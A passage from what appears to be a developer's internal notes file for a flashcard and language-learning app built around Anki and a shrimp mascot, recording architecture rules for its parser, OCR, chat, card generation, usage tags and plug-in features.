  server); page-number strip `(?<!\s)\s+\d+$`; toc lookups via an index (`candidatesFrom`); `headKey` computed once.
- **The outline code is `src/server/knowledgeOutline.js`** (`extractOutline`, `sliceSections`, `TOC_NAME_RE`;
  vite.config.js imports it; tests incl. linear-time and generated books). A dotted-leader line ("Chapter 3 .... 41",
  a PDF's contents page) is never a heading; a running head whose text is itself a chapter line never beats the real
  chapter; 1-2 character numbered CJK titles count; a bare "CHAPTER N" takes a short title-like next line as its title.
- **`detectHeadings` heuristics**: PROSE, not heading: a numbered/chapter-word line lowercase after the number
  (`proseAfterNumber`); a chapter-word/CJK line ending in a period with no separator; a capitalised line starting with
  a `UNIT_WORDS` unit, containing a sentence break (not `ABBREV_WORDS`), or ending on a lowercase function word.
  `hasMarkdown`: trusted in `.md`; in `.txt` only with 3+ `#` lines and no chapter lines. Running heads: bare
  "CHAPTER N" keeps its number in `headKey`; the copy without page number wins; a title with a different leading
  page number every time is dropped. Levels: `chapterLevel`, `cjkLevel` (部 0, 章 1, 节 2), numbering depth,
  `tocLevel` (indent). Files walk in NATURAL order. toc.txt: contents line = dotted leader or it AND the next end in
  numbers; roman page numbers only after 4+ leader chars; trailing numbers of the entries themselves are titles
  (`titleNums`); number-stripped forms compare only when one side had a number.
- **PDF**: extracted CLIENT-side (`src/utils/pdf.js`, lazy `pdfjs-dist`) to `.txt`. Lines from y + `hasEOL`, new line
  at `|dy| > max(2, 0.7 * size)`. `pdfNoText` for image-only. `cMapUrl`/`standardFontDataUrl` passed (CJK text). No
  space between CJK items (`CJK_END`/`CJK_START`; Hangul keeps); a space only between runs APART (`prevStart`, RTL
  too); a run back over the previous (accent) is glued. Line building is pure `linesFromItems(items)` (tested).

## Discover tab (adaptive new-card engine)
- **The learner profile is per mode**: chats are tagged with `mode` on save (`chatTabSaveCurrent`);
  `buildLearnerProfile` reads only `s.mode === activeMode.name` chats. A stored profile counts only for its deck
  (`profileFitsModeDeck`); changing the MODE deck resets Discover (layout effect on `ankiDeck`).
- **Free text in the APP language** (`userLanguage` = `userLangName()` in `buildProfilePrompt`/
  `buildSuggestionPrompt`), dash-stripped; never hardcode English.
- **Kinds for every mode**: language kinds live in `buildSuggestionPrompt` (`src/discover/prompts.js`); general modes
  get AI-made `activeMode.discoverKinds` (`[{key,label,rule}]`, once per mode via `ensureDiscoverKinds`: in-flight
  guard per mode id, retry only on failure, `updateModeById`), static fallback otherwise; a kind's `rule` overrides
  the table (`customKind`).
- **Deck switcher** (`discoverDeck`, `''` = mode deck, live in `discoverDeckRef`): re-profiles, rebuilds exclusions,
  saves there; resets on mode switch. Saving goes to `discoverDeck || ankiDeck || ankiDecks[0] || 'Default'`
  (non-persistent). Final dup check includes `discoverDeckTermsRef`. `ankiDecksRef` = live deck list (init runs
  before `ankiDecks` arrives).
- **Shape on EVERY read**: `shapeProfile` (`src/discover/profile.js`; an old object `summary`/`level` crashed
  Discover), `shapeLedger`/`mergeLedgers` (`src/discover/merge.js`);
  `discoverKinds` are text; Studio's review card renders through `asText`.
- **Instant-paint cache** (`localStorage('ebiki-discover-cache')`, also the offline fallback). **The mode-switch reset
  effect and the init effect must BOTH be `useLayoutEffect`** (one pre-paint flush), else blink + broken re-init
  (`discoverInitRef`). Cache writes skip `null`/`DEFAULT_LEDGER`. A cached ledger enables ledger WRITES only when
  `ledgerVerified` (`discoverCachedLedgerRef`): a ledger kept after a failed read replaced the stored history.
- **Anki media names are FLAT: `_ebiki_<kind>__<key>.json`** (adapter's `blobFileName`): a "/" name (legacy
  `_screenlens/...`) can't be overwritten in place. The legacy name is read once as a migration source, after local.
- **`writeBlob` (`src/discover/storage.js`) does NOT sync**; pass `{ sync: true }` only when worth pushing now.
- **Async guards**: the duplicate set loads under a MODE + DECK-SWITCH token (`discoverGenRef`); the cache paint runs
  only on the mode deck; a save retired by Adjust says `d_saveCancelled`; web-verify checks `live()` after its await.
- **Legends level, opt-in per mode** (`activeMode.discoverUseLevel`, default OFF): `useLearner(activeModeId)` (kit
  store, no Legends import) → `learnerLine(...)` as `learnerLevel`. Tests: `src/discover/prompts.test.js`.
- **Actions** via `discoverExcludeList`: I Know This = `known`, Skip = `declined` (excluded forever), Next records
  nothing.
- **Dialect + mode language**: `fetchNextSuggestion` appends `dialectRule()`; `buildCardFields` (Discover + Picture)
  takes `srcLang` from `learnLangName()` in language modes (not global `language`).

## Ebi the mascot & poses
- Poses in `public/assets/shrimp/`, registered in `src/config/shrimp.js` (`SHRIMP`); `DEFAULT_SHRIMP` (the AI's
  `"default"`), `IDLE_SHRIMP` (Help's resting pose).
- **`choosePose(text)` (App.jsx) is the ONLY thing that sets a pose**, once per call (no flicker): with a key the
  `resolveModel('pose')` role names one, else `pickShrimp(text)` (whole-word keywords, never substrings). Ebi reacts
  only to ASSISTANT messages. Study poses are precomputed per question (`q.pose`).
- Empty states use bare `poseFile('…')` PNGs, no glow. **`helpMascot` is independent of `studyMascot`.**

## Ebi's Help chat (`src/components/HelpChat.jsx`)
- **Screen context is GATED BY `activeTab`**: `buildSystemPrompt` opens with the "RIGHT NOW ... SCREEN" line and
  emits only that screen's detail. The live card's FRONT is SECRET like its answer (on a language card it IS the
  answer); answers stay secret unless explicitly asked. The live question is "ON SCREEN" only when `tab==='study'`
  (`studyActive` persists across tabs). `appContext` (bottom of App.jsx) must stay CURRENT: live question from
  `currentQuestion` + `studyCardState`, NEVER the always-empty legacy `studyQueue`. **New tab → its `SCREEN[...]`
  label AND a tab-gated block.**
- **Help can ACT**: `<action>{...}</action>` parsed/stripped in `sendMessage` → live `onAction` (`onActionRef`) → App
  applies with pinned refs (`activeModeIdRef` + `updateModeById`). Types: `question_preference`, `set_dialect`,
  `deck_edit` (opens Deck, prefills ✨ Ebi bulk edit; `pendingDeckEditRef` runs the PREVIEW once notes load, writes
  nothing). New action = CAPABILITIES text + an `onAction` branch + a receipt. Values must be STRINGS (an object
  became "[object Object]"); saved/echoed values go through `helpText`. `deck_edit` runs only on a note load started
  after it (`deckNotesReqRef`/`deckNotesLoadedReqRef`) and bumps `pendingDeckEditTick` (else nothing re-ran the
  effect when already on Deck).
- **Every action returns a verified receipt**: an app-authored string of what really happened or that it was NOT
  applied, appended under `hr_header` (`hr_notApplied` when nothing applied). i18n only (`hr_*`; feedback chat
  `fbr_*`). Gate "saved" wording on `updateModeById`'s return (false when it bailed). A Studio reply cut off inside
  `<mode>` shows `studioCutOff` and clears the old proposal. Reply processing is pure `processHelpReply(raw, { t,
  parse, run })` (tested): multi-line actions run, only a non-empty STRING receipt counts (else `hr_notApplied`), a
  failed pose pick never costs the reply. Studio's reply parsing is `src/components/studioReply.js` (tested).
- Opened by the header's "Talk to Ebi" (bumps `askEbiSignal`), rendered `hideButton={true}`.
- **In character**: `HELP_BASE` speaks as Ebi; never calls itself a "mascot".
- A Learn-it lesson or PBQ result on screen sends `learnMoment` and NO `currentQuestion` (it was already the next
  card's); `currentQuestion` is also null off the question phase, during a flash, and for a done card.
  `gradedRecent`/`grammarSlips` omit the live card. A send after a FAILED save keeps the panel's turns when the disk
  copy is only their prefix. Saves honor `dataSwitchingRef` via `canSave`.
- **THE LEARNER CONTEXT is the one way to get learner context anywhere** (the owner: "context should be accessible
  throughout the whole app"). **Never write a second gatherer.** `ctx.learning.context({ fresh })` gathers via
  `kit/learnerContextGather.js`, shapes via `kit/learnerContext.js` (pure, tested); feature sources plug in with
  `registerLearnerContextSource`. Every part carries `ok` (a failed part is never "knows nothing").
  - **Consumers go through `kit/learnerContextUse.js`** (`CONTEXT_USES`: sections + budget per consumer `help`,
    `chat`, `question`, `practice`). `question` is wording only and NOT in the question-reuse signature.
  - **Prompts NEVER wait for a gather**: they read `ctx.learning.cached()` (`learnerSnapsRef`; stale → throttled
    background refresh) through `learnerBlock(use, opts)`; `snapshotForMode` drops another mode's snapshot.
  - **`redactSnapshot` is the secrecy guard**: `hideFronts`/`hideAnswers`/`reveals` (Help: the live card; question
    generation: the card's headword) and `secret` (a `quiz` Help entry exists: no card lists, meanings or feature
    sections; recently PRACTICED card fronts are dropped too, keeping only topic lines). Evidence/level judging uses
    the raw snapshot.
- **Features tell Help what the learner does** (the owner: "Ebi is supposed to have context of anything the user
  does"): `ctx.help.set(id, { text, screen })` → `featureHelp` → `appContext.featureContext`, on EVERY screen ("ON
  SCREEN NOW" vs "BACKGROUND"). Plain facts, **never the answer of a question being answered** (`ebi-call` targets,
  `mistake-gym` items, `scenes` lines and Legends item meanings are hidden while those run; `quiz` shows the answer
  only once feedback does). **A new feature or screen reports here too**: `useHelpEntry(ctx, id, text, screen,
  where, depth)` (`kit/useHelp.js`, clears on unmount); the deepest `where` on the tab in view joins the RIGHT NOW
  line (`screenWhere`). Legends' entries: `HelpBridge.jsx`, `helpContext.js`, `bestiaryHelp.js` (pure, tested; names
  and rules from i18n, never a card).
- **HARD RULE: Ebi NEVER emits a shrimp emoji.** Forbidden in prompts (HELP_BASE + Chat `systemPrompt`) AND stripped
  in code (`[🦐🦞🦀]️?` beside the dash strip in HelpChat `sendMessage`, Chat `cleanText`, search-offer answer).
- **Docking** (◣ or drag ⠿: left / right / under the question; previews from one `ZONE_RECTS`): `snapZone` + `chatPos`
  remembered (`ebiki-help-dock`/`ebiki-help-pos`). Sizes divide by `var(--app-zoom)` to undo the body zoom. The
  chooser shows in every state (docked: "Move…", `help_dockMove`), works by keyboard (arrows + Enter). Sizes come from
  `dockSizes(w, h)` (tested; side 24% of width, 250..380 px, capped 42%; under 440 px usable a drawer; bottom ≤ 45%).
  Docks start right of the sidebar and above the phone bottom bar; a bottom dock pads `<main>` so the answer box
  scrolls clear. Closing Help returns focus to what opened it.

## ⭐ HOW TO ADD A BUTTON
1. **Base style** from `S` (`src/styles/theme.js`), spread then override:
   - Ghost/action (most buttons): `{ ...S.ghostBtn, fontSize: 10-12, color: <accent>, borderColor: <accent ~.3
     alpha> }`. Accent is a CSS var, never hex: `--c-danger` destructive · `--c-warning` caution/session ·
     `--c-brand` primary-ish · `--c-purple` AI/insight · `--c-success` Anki/save · `--c-ink-dim` neutral.
   - Solid CTA (max one per screen): `{ ...S.captureBtn, borderRadius: 6-8 }` + `className="btn-press"`.
2. **Hover is AUTOMATIC** on `<button>`, `<select>`, checkboxes (`--c-hover`). Cards/tiles: `.ui-card` + `.ui-lift`.
   Only add: `click-dim` on clickable `<div>`s; `ui-btn` to deepen a ghost border; `ui-tab` (+ `ui-tab-current`) for
   nav tabs; `card-head` for clickable card headers (inner controls `stopPropagation`). `.hover-dim` is a no-op.
3. **Never animate position on hover.** Only `.btn-press` moves, on `:active`.
4. **Disabled** = `opacity: .5` + `cursor: 'default'` + the real `disabled` attr.
5. **Labels** via `t('key')` in all four languages; leading emoji OK. Explanations: `className="tip" data-tip="…"` on
   a ⓘ span, NEVER a bare `title` (1s delay); no `overflow:hidden` on ancestors.
6. **Never `boxShadow: 'none'` on a hoverable control** (overrides the inset hover). Only
   `...(active ? { boxShadow: SHADOW.sm } : {})`.
7. **Segmented controls**: selected segment gets `ui-tab-current` + `cursor: 'default'`.

## ⭐ HOW TO ADD A NEW EBI EMOTE
1. Put the ORIGINAL image in `public/assets/shrimp/` (any size, any common format incl. SVG); never shrink it by
   hand. `src/server/ebi-images.js` serves `/assets/ebi/<file>` (via `shrimpUrl`) as a cached ≤`EBI_MAX_PX` WebP in
   machine-local `.cache/ebi/`, falling back to the original. Keep sharp's file cache OFF (it locked files on
   Windows). Plain file names only.
2. Add one `SHRIMP` entry in `src/config/shrimp.js`:
   ```js
   { name: 'ninja', file: '12345-ninjashrimp.png',
     keywords: ['ninja', 'stealth', 'shuriken', 'martial arts', 'sneak'] },
   ```
   `name` (unique, lowercase) joins `POSE_NAMES` so the Mascot AI can pick it; `keywords` drive the fallback (add
   synonyms + some Spanish).
3. Keep keywords non-overlapping (ties break by a text hash). Sanity-check by importing `pickShrimp` in node, or
   `npx vite build`.

## Picture tab (vision OCR, Tesseract for boxes)
- **No key = local OCR, never a dead end**: `analyzeImage` runs `analyzeImageTesseract` (own scan generation), words get
  boxes untranslated (`untranslatedOcrWords`), a hint + "Add a key" button; `lazyTranslate` returns early without a key.
- With a key: `analyzeImageVision`, one `aiCall` with `resolveModel('picture')`, `images`, `maxTokens: 8000`, returns
  words with in-context meaning, reading-order `line` and a box. No key: `analyzeImageTesseract`. `aiCall` passes
  `opts.images` to every provider (`src/utils/image.js`: `dataUrlToImagePart`, `downscaleDataUrl`, which paints white before JPEG: transparent PNGs turned black).
- **Boxes come from Tesseract** (`getTesseractBoxes`, parallel): vision words snap to the nearest matching box; the
  rest get `_approxBox`, not drawn by `renderWordOverlays` (still in the reading panel), skipped by the overlap clamp.
  A word also matches a RUN of neighbouring boxes on one line ("por favor") or a character-count slice of one wide box
  (CJK). The box logic is `src/utils/ocrBoxes.js` (`snapWordsToBoxes`, `overlayBoxes`, `readingLines`,
  `hoverTooltipPos`, tested); every OCR path builds reading lines (mostly-RTL lines read from the right).
- **Untranslated words** (`_untranslated`) go through `lazyTranslate(idx, words)` after a Tesseract scan and on hover,
  indexed by POSITION in the passed list (the callback's own `ocrWords` is the previous scan's). A failed answer frees
  the index for retry (else "Loading…" forever). An untranslated `translation` is `''`, never a stored "Loading…".
- Language modes translate learned → user language on EVERY path. `o: true` rows (`_own`, user's language) make the
  card for the TRANSLATION. "Generate card" is disabled on an untranslated word (direction unknown). An unsaved
  `targetLang` follows the APP language while it still equals the old default (`targetLangAppRef`, set first by the
  config load so the load isn't a switch).
- Reading panel lines keep the model's order (never sorted by x0: RTL). AI JSON via `parseAiJson`.
- **Overlay status** (`GET /api/launch-overlay`): the tracked process, else one found by COMMAND LINE
  (`main.cjs --overlay`). Never "any electron.exe" (the app window and VS Code are Electron too).
- **A new scan clears index-keyed state** (`ankiSynced`, bumps `pinGenRef`). **Every `pinGenRef` bump calls
  `resetPinBusy()`**; word actions clear their busy flag only while their pin is current. Overlay auto-analyze timers
  are gated on `scanGenRef`; `overlay-reset` clears `window.__autoAnalyze`. Progress text (`pic_prog*`) goes through
  `tLiveRef` (memoized callbacks hold an old `t`). "Add to Anki" and Refine use the open EDITOR's text.
- **OCR input is opaque**: `preprocessForOCR` (`src/utils/ocr.js`, tested, with `tidyOcrWords`) paints a black or white backdrop picked from the content + alpha 255 (transparent read as black; white text on white vanished)
  and resolves the ORIGINAL when the canvas can't be read (else it hung). The clean fast path needs few words under
  70% confidence (else they were silently dropped).
- **Tesseract fallback translation** checks `stale()` around every chunk; `imageLoadSeqRef` = newest picture wins; a
  refine lands only if `ankiCardVerRef` is unchanged. `loadImageFromDataUrl` retires the running scan only in
  `onload` (an undecodable HEIC killed it). Drops take the first IMAGE file and never switch tabs for a non-image.
- **Zoom-aware tooltips**: rects/`clientX` are real px, `left/top` layout px: divide by `getZoom()` and clamp pinned
  popups to the zoom-adjusted viewport.

## State persistence across refresh
- A blank themed `<div>` until `configLoaded` (no flicker). Persisted: `activeTab` + settings → `config.json`;
  `activeModeId` + modes → `modes/_meta.json`; localStorage `ebiki-chat-session`, `ebiki-deck`, `ebiki-study-session`.
- **`beginStudy` touches `studyLoading`/`ankiError` only while its session is current** (`mine()`); `exitStudy`
  clears `studyLoading`. A starting session counts as live for `endStudyForModeSwitch`.
- **Restore re-queues cards the cursor passed before they got a state** (else a reload skipped them). "Back" never
  reopens a `rating: 'deleted'` card; "Yes, delete" is claimed once (`studyDeletingRef`). The post-sync refresh reads
  `deckBrowserDeckRef` / `studyDeckLiveRef`, never the render's deck.
- **The Study START screen is not a live session**: the deck-follow effect runs for `studyPhase === 'pick'`; a
  restored pick screen never switches the mode back. A FAILED snapshot write removes the stored one (a stale copy
  re-answered cards in Anki).
- **Study resume** only after a SUCCESSFUL modes read (`modesLoadedRef`); writes gated by `studyHydrated` (no clobber
  before the one-shot restore).
  - **Expires** after `STUDY_SESSION_MAX_AGE_MS` WITHOUT PROGRESS: clock is `activeAt` (`src/utils/studySession.js`,
    bumped only when `activitySignature` changes), never `savedAt` (the restore re-saves).
  - An idle live session and an expired snapshot with unsynced ratings (`studyAbandonedRef`) end QUIETLY
    (`endAbandonedStudy`: sync, then `teardownStudy`, note `study_closedIdle`); while ratings can't reach Anki it
    stays and blocks (`call_studyUnsynced`). Features ask via `kit/studyGuard.js` (`studyBlock`).
  - The snapshot stores cards through `snapshotCard` (full cardsInfo blew the quota). A restore SANITIZES: unsynced
    `gradedAt` re-stamped; stuck `evaluating` cards re-graded (`resumeReEvalRef`); `currentQuestion` validated.
  - **Stall-rescue effect** (near `startBatch`, `pullsInFlightRef`): pulls a card when the question phase has nothing
    to show, evaluate or pull; also runs when the restore was skipped.
- **Capture shortcut: `Alt+Q` only** (no `Ctrl+Shift+A`): switches to Picture first (else the capture was never
  shown). `/api/launch-overlay` tracks its child by identity (`overlayProcess === p`), refuses a second while an
  untracked overlay runs, waits for a pending DELETE's sweep; launch POSTs serialize (`overlayLaunchChain`). The
  header toggle acts on `overlayRunning`, not the saved `overlayEnabled`.
- The overlay re-reads keys, config, modes and decks on every `overlay-reset` (`refreshOverlaySettings`, read-only;
  it loaded once, often before onboarding set a key); auto-analyze waits for it (`overlaySettingsReadyRef`, 5s cap).

## Back / Forward (`src/nav/`): the mouse's back button, Alt+Left, a phone's back button
The app keeps its OWN history of React-state slices: `history.js` (pure stack, `nav.test.js`), `index.js` (service
`nav`), `react.js` (`useNavEntry(key, value, apply, { enabled, rest, guard, replace, replaceWhen })`, re-exported by
`src/features/registry.jsx`; `ctx.nav`). Device input via `platform.history` / `onDeviceNav` (mouse 3/4, Electron
`app-window:nav`).
- **Changing a slice TO its `rest` value UNWINDS** to the earlier matching entry (closing never leaves a "reopen").
- **Back never abandons something running silently**: `guard(to, from)` returns false (stay), true, or `'skip'`
  (entry can't be shown again). Study asks (`nav_leaveStudy`) then runs `exitStudy`; Legends runs ask
  (`nav_leaveRun`), `inferring` refuses; Practice asks (`nav_leaveActivity`). Every move is blocked while a dialog,
  Ebi Studio, the wizard or a data switch is up. A screen mounting on an entry restores itself only on a plain `true`
  guard (never a dialog while mounting).
- A guard entry behind the first: Back at the root never leaves the app. Never in the overlay. Electron: never
  `webContents.goBack()` (could reach the holding page).
- New screen or sub-view: one `useNavEntry` with a `<feature>.<what>` key; plain-data values only.
- **Feature Modals are LAYERS** (`nav.layer` / `useNavLayer`, wired once in `ui.jsx` `Modal`): opening is an entry, so
  Back closes the top modal instead of changing the screen under it; its ✕/Esc steps back (no dead entry); Forward
  passes over a closed one; a non-dismissable one (the player chooser) refuses Back while up.

## Card generator (shared, language-agnostic) + Quick Add
- `generateCards(words)` works for any subject. **Language modes** → `LANGUAGE_CARD_PROMPT` with `learnLangName()`
  and `userLangName()`; back labels are IN the learned language. **Other modes** → `GENERIC_CARD_PROMPT` with the
  mode's `description`, `backTemplate` (fixed format when it has `{placeholders}`) and `tagRules`. Returns
  `{ front, back, tags, correction }`. `cardBackToHtml` bolds each line's leading `Label:` in any script. Added via
  `ankiAddNote` (allowDuplicate for Quick Add) + sync; the `ankiCanAddNote` pre-check only warns.
- **General modes write card content in the APP language** (`{USER_LANG}` in `GENERIC_CARD_PROMPT`,
  `contentLangRule` in `buildCardFields`, Chat `<anki-card>` general format); front term, proper nouns, code,
  formulas and tag tokens stay original. `createMode` writes `chatSuggestions`/`questionPrompt`/`mnemonicHints` in
  `userLangName()` too.
- **Language modes always ask the model for `partOfSpeech`** when a template uses it (learned language); a caller's
  code ("adj", "verb") is only a hint. `withBasicModel` uses the "Basic" type's REAL field names (`basicFieldNames`,
  cached): a renamed Basic made every add "empty".
- **An empty placeholder must not ship its punctuation** (`{word} ({partOfSpeech})` → `word ()`): `buildCardFields`
  asks for a missing `partOfSpeech`; `cleanTemplateGaps` strips only EMPTY bracket pairs.
- **`generateCards` is BATCHED** (8 words per call, `maxTokens: 8000`, each batch proofread): one big call hit the
  output limit and silently lost cards. A failed batch is counted (`missedWords`, `deck_genPartial`), fatal only if
  all fail. A reply cut off mid-list re-queues once the uncovered words AFTER the last word a card covers. Cards are
  kept once per run by FULL front (`madeFronts`). A short `verifyCards` reply is a cut-off prefix: unreached cards stay
  unverified, never checked twice.
- Quick Add guards: "Add N" stops when a new tray arrives (`quickAddTrayRef`); results drop after a mode switch or
  Close; Generate is disabled while "Add N" runs (`quickAddBatching`); added/adding tray cards are read-only; the dup
  check uses `deckBrowserDeckRef` after generation and drops the tray if the deck changed.
- **Accuracy guardrail (cards get MEMORIZED)**: `verifyCards(cards, label, isLang)` second pass fixes nonexistent or
  misspelled words, wrong gender/translation/example, dishonest usage tags; general modes get a facts proofread that
  keeps tags (usage-tag, preferred-term, gender checks are language-only). Prompts say "never invent words, verify,
  admit uncertainty". The question prompt's AMBIGUITY SELF-CHECK asks general modes for a sense cue, never a letter.

### Usage tags (`src/tags/usage.js`): where, how often, in what context
A definition alone teaches the wrong thing ("anegada = flooded", but natives say "inundada"). Three families on every
language card and the tapped-word lookup, in this order:
- `region-*`: `region-global` if natives everywhere use it in this sense, else `region-<place>` (`region-spain`, …).
- `freq-*`: MANDATORY, exactly one of `FREQ_SCALE` (`freq-core` / `-common` / `-uncommon` / `-rare`).
- `register-*`: only when genuinely restricted, from the CLOSED `REGISTERS` list (keeps Anki's tag tree clean).
  Neutral words get none.

Where the rule lives (keep in sync): `LANGUAGE_CARD_PROMPT`'s tags line; `usageTagsRule()` next to `dialectRule()`
(Chat `<anki-card>`, `buildCardFields`, bulk-edit framing, appended even over custom `tagRules`);
`usageTagsContract()` + `usageTagsVocab()` (lookup + check). Every prompt makes the model state `usageEvidence`
BEFORE the tags. Distinct from the DIALECT (which variant content is written in).
- **Over-claiming is the harmful direction** (a false "everyday/universal" makes the learner SAY it). Unsure → only
  backable regions, the LESS common frequency. `verifyCards`/`verifyDeckRecs` demote doubtful claims.
- **A check that did not run returns `failed: true` and is never cached** (lookup cache, `usageTagCacheRef`), so it
  retries.
- **Double-check on the lookup path**: `checkUsageTags` answers WITHOUT seeing the first pass; `reconcileUsageTags`
  (pure, tested) merges: freq → less common (flagged if ≥2 apart); region → intersection (global vs specific →
  specific; disjoint → union, flagged); register only if both named it. Unconfirmed tags render gray-dashed with "?".
  `deriveUsageTags` covers untagged cards; `resolveCardUsageTags` prefers the card's own tags. `studyWordMakeCard`
  carries the CONFIRMED tags.
- **Region sets spanning the language collapse to `region-global`** (`collapseSpanningRegions` + the `REGION_SPANS`
  data table, never `if (lang === …)`). `foldUsageTags` (normalize + collapse) is the funnel for every producer.
  `analyzeDeck` collapses only PROPOSED tag lists.
- **🏷 Tag audit** (deck browser, language modes): `usageTagAuditInstruction()` through the bulk-edit pipeline.
  TAGS-ONLY; `keepAuditContract` (in `analyzeDeck`) keeps every non-usage tag (`recommendedTags` replaces the whole
  list) and never changes fields. Refine reads `deckAnalyzeTagsOnly` (recorded at run time), never a rebuilt
  instruction (it changes with dialect/language).
- **Rendering**: `renderUsageTagChips` + `sortTagsUsageFirst`, `usageTagStyle` (green safe, amber heads-up,
  gray-dashed unconfirmed), `usageTagTip`. **New tag-chip surfaces must use these** (`DiscoverPanel.jsx` imports
  them). Popup and Learn-it panel also show `otherTags` separately (only usage families are double-checked).
- **Tooltips are i18n'd** (`tag_*`); `usageTagTip(tag, {unverified, t})` returns '' without `t`; `usage.test.js`
  checks all four locales.
- **The live study question shows usage tags** (language modes only), filtered by `isUsageTag` so a topic tag can't
  leak the answer. `cardsInfo` has no tags: `loadStudyCardTags` does ONE batched `notesInfo` per session (refreshes
  `usageTagCacheRef`, cleared at session start). No derivation fallback (it would stall the question).
- `normalizeUsageTags` folds invented spellings (`region-usa` → `region-us`) and drops junk from generated cards and
  bulk recs, but NEVER touches a tag a card already carries. `mapRecs`/`verifyDeckRecs` fold only in LANGUAGE modes;
  Refine folds its own tags.

### Preferred-term honesty
Never teach the headword as the everyday word for a meaning a synonym dominates in the studied variant ("barro =
mud": LatAm says "lodo"). Distinct from usage tags (where) and dialect (which variant).
- `LANGUAGE_CARD_PROMPT`: translations ordered by the senses the headword owns; the usage line is REQUIRED for a
  synonym-dominated sense, naming the preferred word.
- `preferredTermRule()` (next to `dialectRule()`) in `generateCards`, `buildCardFields`, Chat `<anki-card>`,
  `lookupStudyWord`. `verifyCards` enforces it ("technically true but misleading" = wrong); questions never quiz a
  synonym-dominated sense as the word's identity.
- Existing decks: **🌎 Dialect audit** = `analyzeDeck('custom', dialectAuditInstruction())` via the bulk-edit review.

### Quick Add and chat cards
- **Deck → ⚡ Quick Add** (`quickAdd*`): paste words → `generateCards` → editable review tray → "Add N to {deck}".
  A new generation is refused while "Add N" runs (it walks the tray by index). Adds use `deckBrowserDeckRef`, stop on
  a deck switch, and `quickAddTrayRef` (bumped by a new tray and Close) keeps a late add off the next tray.
- **Chat cards** render as `<anki-card>` widgets; `chatTabSyncCard` formats + syncs. The button names the target deck
  (`chatCardDeck()` = attached deck → `activeMode.ankiDeck` → first deck → `Default`).
- The composer's **"Attach deck…" dropdown is ALWAYS rendered** (disabled when Anki is down); once attached, the
  `chat_attached`/`chat_attachedOne` chip replaces it IN PLACE.

## Chat
- **"+" menu**: photo, web search, per-mode Focus/Level/Explain-in (`activeMode.chatPrefs` via `setChatPref`, into
  the system prompt in `sendChatTabMessage`), Chat model (writes `aiModels[provider].chat`, same override as
  Settings). Closes on Esc and tab change.
- **Images**: `chatTabImage`; photos from the last 4 USER messages ride along as `opts.images`. Every attach goes
  through `attachChatImage` (refuses HEIC/TIFF); the send drops parts outside `PORTABLE_IMAGE_TYPES` (JPEG/PNG only:
  one bad image failed every later message; `downscaleDataUrl` re-encodes others). Last pick wins
  (`chatImageSeqRef`). A paste with `text/plain` keeps its TEXT (Excel/Word add a PNG).
- **Chat honors the writer freeze** (`dataSwitchingRef`: saves, progress notes, rename, delete). Delete asks
  (`chat_deleteConfirm`), waits for card-add saves (`chatCardSavesRef`), compares with `chatTabSessionIdRef`.
  Re-clicking the open chat does nothing (it reloaded over unsaved turns). `chatTabMsgsRef` is set the moment a
  reply lands.
- **Chat switches block sends** (`chatSwitchingRef`, `chatSendingRef`; restore-on-mount yields to a started chat).
  History for every AI call goes through `boundChatHistory` (60k chars), which also appends each turn's `<anki-card>`
  JSON. An EMPTY `<progress-update>` is ignored (it erased the notes); one over changed notes is skipped and the chat
  ADOPTS the current notes.
- **Scroll**: sending pins the latest USER message to the top (`scrollChatToLatestTurn`, sizing `chatSpacerRef`;
  recomputed after paint and on resize). The composer is never disabled while loading (it would blur).
- `choosePose` is awaited so pose and text appear together. The reply cleanup strips dashes but never collapses
  whitespace (code) or lets a dash join lines (`stripDashes` keeps digit ranges). Cleanup + `boundChatHistory` live in
  `src/utils/chatReply.js` (`cleanChatReply`, tested).
- **Offer-to-search**: with web search OFF the model emits `<offer-search>query</offer-search>` instead of guessing
  (`chatOfferSearchAccept` / `chatOfferSearchDecline`).
- **Reply parsing**: `<sources>` via `parseCitedSources`, keeping only URLs the search returned (`keepRealSources`);
  a trailing unclosed tag block is stripped. Chat cards go to Anki as PLAIN text (`escapePlainHtml`); tags via
  `normalizeChatCard`.
- **Web search** (`/api/web-search`, DuckDuckGo HTML): skips ads (`result--ad`, `duckduckgo.com/y.js`: they came back
  as fake sources); real URL from `uddg`. **A search that never ran is a FAILURE** (bot check → 502 `{error}`), and
  the "cite the results below" rule is added only WITH results (else the model invents citations).
  `__ebikiRejectionGuard` logs unhandled rejections instead of killing the dev server.
- A mode switch clears the attached deck (`chatAttachSeqRef`). Chip backfill writes text only (`cardText`) and only
  while the live mode has no chips.
- Renames ignore empty/unchanged titles (`chatRenamingRef`); renaming the OPEN chat waits while a reply or card add
  runs (`chat_renameBusy`). A chat tagged with ANOTHER mode (`chatOwnMode`) adds cards to that mode's deck, no audio;
  a forked card-add save lists the new id under the original's mode.
- **Markdown** (`src/components/Markdown.jsx`, `marked` + `DOMPurify`, `.md-body`): assistant only; user text is
  literal. `<anki-card>`/`<sources>`/`<progress-update>` are stripped first.

## Features are plug-ins (`src/features/`): build every new feature this way
Each feature is ONE folder (`src/features/<id>/`) registered in ONE line of `src/features/index.js` (+
`src/features/server.js` for a server half). Deleting a feature = its folder + those lines. **Never thread feature
logic through App.jsx**; App only provides context, renders slots, emits facts.
- **Descriptor** (documented in the `registry.jsx` header): `id`, `defaults` (config.json `features[id]`), `Mount`,
  `headerItems`, `railCards`, `navItems` (`{id, icon, labelKey, order, Screen, rail?}`), `settingsCards`, `on`.
  Feature TEXT lives in `src/i18n/locales/*.js`, never in the feature.
- **`subject.rules` is a STRING** (as a function its source code went into feature prompts).
- **Context**: `useFeatureCtx()` (`t`, `activeMode`, `busy`, `isDataSwitching()` (writers must honor it),
  `featureSettings`/`setFeatureSettings`, `notify`, `learn.savedHooks`/`makeHook`, ...). A feature needing a service
  gets a GENERIC one added here; never feature-specific props.
- **Events** (`events.js`): App announces FACTS; features react. New cards go through `addNewCard`, graded cards
  through `emitOnce` (keyed by run + card, persisted: re-rates and restores don't repeat). Throwing handlers are
  isolated.
- **Server half**: `dataEntries` join `DATA_ENTRIES`, `dataRoutes` join the unreachable-share guard, `localFiles`
  are watch-ignored (add to `.gitignore`). Ignores are ANCHORED to the app root (`**/features/**` also ignored
  `src/features`, killing hot reload). `register(server, helpers)` adds routes after the guard (helpers: `dataPath`,
  `readUtf8`, `writeFileAtomic`, `appRoot`, `fs`, `path`, `crypto`).
- **Shared UI** (`src/features/ui.jsx`): `Card`, `ChunkyButton`, `ProgressBar`, `Modal` (zoom-safe), `EbiSays`,
  `tCount`, `depthBorder` (never mix `border` with `borderBottomWidth`). Tunables are named constants at module top.
- `features.test.js`: no own strings, labels translated, slot components, known events, distinct data entries, NO
